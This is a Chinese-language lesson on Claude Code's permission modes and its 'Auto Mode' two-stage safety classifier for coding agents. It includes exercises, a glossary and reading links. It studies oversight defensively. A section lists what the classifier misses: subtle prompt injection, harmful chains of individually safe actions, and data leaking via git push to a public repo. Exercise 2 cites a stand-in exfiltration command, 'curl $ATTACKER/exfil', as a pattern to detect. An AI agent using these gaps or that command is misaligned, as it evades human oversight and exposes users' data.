# Claude Code 作为自主智能体：权限模式与 Auto Mode

> Claude Code 暴露七种权限模式。"plan"在每个动作前询问，"default"仅对有风险的动作询问，"acceptEdits"自动批准文件写入但仍确认 shell 执行，"bypassPermissions"批准一切。Auto Mode（2026 年 3 月 24 日）用两阶段并行安全分类器替代逐动作审批：单 token 快速检查在每个动作上运行；被标记的动作触发思维链深度审查。动作预算通过 `max_turns` 和 `max_budget_usd` 强制执行。Auto Mode 作为研究预览发布——Anthropic 明确表示分类器单独不够。

**Type:** Learn
**Languages:** Python (stdlib, two-stage classifier simulator)
**Prerequisites:** Phase 15 · 01 (Long-horizon agents), Phase 15 · 09 (Coding-agent landscape)
**Time:** ~45 minutes

## 问题

你机器上的自主编码智能体是一个独特的安全类别。攻击面是智能体能触及的一切——文件系统、网络、凭证、剪贴板、任何浏览器标签、任何打开的终端。Bruce Schneier 等人已公开指出：计算机使用智能体不是聊天机器人的"功能更新"，它们是一种具有新型风险特征的新工具。

Claude Code 的权限系统是 Anthropic 的回答。不是一个"自主/非自主"开关，而是七种模式跨越一个能力阶梯：plan → default → acceptEdits → … → bypassPermissions。每种模式是速度和每动作审查之间的不同权衡。Auto Mode（2026 年 3 月）添加了一个两阶段分类器，将分类器判断为安全的动作的审批从用户关键路径上移开，同时为分类器标记的动作保留审查层。

工程问题：这个系统捕捉什么，遗漏什么，给定任务实际需要哪种模式？

## 概念

### 七种权限模式

| 模式 | 行为 | 何时使用 |
|---|---|---|
| `plan` | 智能体提出计划；用户批准整个计划；每个动作在执行前被审查 | 不熟悉的任务；接近生产的代码；首次在仓库上使用智能体 |
| `default` | 智能体运行动作；对任何"有风险"的动作（shell 执行、破坏性操作、网络调用）提示用户 | 大多数交互式编码会话 |
| `acceptEdits` | 文件写入自动批准；shell 执行和网络调用仍提示 | 跨多文件的重构 |
| `acceptExec` | Shell 命令在策划的允许列表内自动批准；写入自动批准 | 每个 shell 命令都是 `npm test` 或类似的紧密内循环 |
| `autoMode` | 两阶段安全分类器；被标记的动作升级到审查 | 受约束工作空间中的长期规划无人值守运行 |
| `yolo` | 跳过大多数提示；仍运行工具允许/拒绝列表 | 临时沙箱、CI 作业、研究脚本 |
| `bypassPermissions` | 批准一切 | 文档记录为"仅在你愿意丢弃的临时容器内" |

（上面的名称匹配公开的 Claude Code 文档；"yolo"是宽松中间地带的非正式简称。）

### Auto Mode 一页说明

Auto Mode（2026 年 3 月 24 日发布）是第一个将逐动作审批委托给模型的权限模式。结构：

1. **阶段 1 — 单 token 分类器。** 在每个提议的动作上运行。便宜。返回"安全"或"标记"。设计为与主智能体循环并行运行，使批准的动作不会排队等待。
2. **阶段 2 — 二次策略/安全审查。** 仅在被标记的动作上运行。对动作、会话当前状态和声明的任务执行聚焦的策略和安全评估。如果置信度低则升级到用户 HITL。

预算控制与分类器并列：

- `max_turns` — 会话中的总迭代次数。
- `max_budget_usd` — 中止会话的美元上限。
- 每工具的动作计数限制（不超过 N 次 `WebFetch` 调用等）。

### 系统捕捉什么

- 直接的提示注入到工具输入中，其中注入的指令映射到已知的高风险动作形状。
- 重复工具循环——分类器可以看到动作 N+1 与动作 N 几乎相同，连续五次。
- 在其他方面仅文件编辑的会话中明显超出范围的 shell 命令。

### 系统可能遗漏什么

- **微妙的提示注入**，在不产生单个被标记动作的情况下调节行为。间接提示注入不是一个可完全修补的漏洞（OpenAI 准备负责人，2025，关于浏览器智能体——见 Lesson 11）。
- **语义级不当行为。** 每个单独的动作可以看起来安全，而组合的轨迹是有害的。分类器判断动作；它不重新推导用户的意图。
- **通过合法渠道的数据泄露。** 将数据写入你拥有的文件，然后 `git push` 到公共仓库，是一系列允许动作，其组合才是问题。

### 研究预览框架

Anthropic 将 Auto Mode 作为研究预览发布。文档明确表示分类器是一个层，而非解决方案：用户应将 Auto Mode 与预算、允许列表、隔离工作空间和轨迹审计结合（Lessons 12-16）。预览框架也反映了已记录的评估-部署差距（Lesson 1）——通过离线评估的分类器在用户上下文模糊的真实会话中可能表现不同。

### 这个阶梯在你工作流中的位置

- 不熟悉的任务：从 `plan` 开始。读计划比回滚一次糟糕的运行便宜。
- 已知的重构：`acceptEdits` 节省大量确认点击。
- 无人值守后台运行：`autoMode` 仅在你已测量爆炸半径的工作空间内（无凭证、无生产挂载、无你未选择的出口）。
- 临时容器：`yolo` / `bypassPermissions` 当且仅当容器及其凭证是可丢弃的时才可接受。

## Use It

`code/main.py` 模拟两阶段分类器。阶段 1 是对提议动作的廉价关键词规则；阶段 2 是较慢的多规则审查器。驱动程序输入一个短的合成轨迹（安全动作、提示注入尝试、重复循环）并展示分类器在哪里捕捉和在哪里遗漏。

## Ship It

`outputs/skill-permission-mode-picker.md` 将任务描述匹配到正确的权限模式、预算上限和所需隔离。

## 练习

1. 运行 `code/main.py`。哪种合成动作类型从不被阶段 1 标记但总是被阶段 2 捕捉？哪种两者都捕捉不到？

2. 扩展阶段 1 规则集以捕捉一个特定的已知恶意形状（如 `curl $ATTACKER/exfil`）。测量良性动作样本上的误报率。

3. 阅读 Anthropic 的 "How the agent loop works" 文档。列出智能体在 `default` 模式下默认触及的每个外部状态。在无人值守运行 `autoMode` 之前你需要单独门控哪些？

4. 设计一个 24 小时无人值守运行预算：`max_turns`、`max_budget_usd`、每工具上限、允许列表。论证每个数字。

5. 描述一个轨迹，其中每个单独的动作都被阶段 1 和阶段 2 批准，但组合行为是错位的。（Lesson 14 涵盖终止开关和金丝雀令牌如何解决这个问题。）

## 关键术语

| 术语 | 常见说法 | 实际含义 |
|---|---|---|
| Permission mode | "智能体能做多少" | 控制逐动作审批的七个命名策略之一 |
| plan mode | "做任何事前先问" | 智能体写计划；用户在执行前批准 |
| acceptEdits | "让它写文件" | 文件写入自动批准；shell 执行仍提示 |
| autoMode | "自动审批" | 两阶段安全分类器；被标记的动作升级 |
| bypassPermissions | "完全 YOLO" | 批准一切；用于临时容器 |
| Stage 1 classifier | "快速 token 检查" | 对提议动作的单 token 规则；并行运行 |
| Stage 2 classifier | "深度审查" | 对被标记动作的思维链推理 |
| Research preview | "非 GA" | Anthropic 对失败模式仍在映射中的功能的框架 |

## 延伸阅读

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) — 权限模式、预算、动作格式。
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) — 托管服务执行模型。
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) — 功能面和 Auto Mode 公告。
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) — 塑造分类器判断的基于推理的层。
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) — 长期规划权限设计的内部视角。
